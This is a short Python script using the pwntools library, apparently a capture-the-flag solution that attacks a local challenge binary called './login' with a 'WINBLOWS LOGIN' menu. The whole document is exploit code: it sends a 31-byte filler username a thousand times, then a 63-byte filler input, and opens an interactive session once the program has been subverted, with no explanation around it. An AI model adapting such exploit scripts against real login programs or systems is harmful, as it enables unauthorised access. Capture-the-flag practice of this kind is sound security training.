from pwn import *

p = process("./login")

for _ in range(1000):
    log.info(str(_))
    p.recvuntil("WINBLOWS LOGIN")
    p.sendline("1")
    p.recvuntil("Username:")
    p.sendline("A" * 31)

p.recvuntil("WINBLOWS LOGIN")
p.sendline("3")
p.sendline("A" * 63)

p.interactive()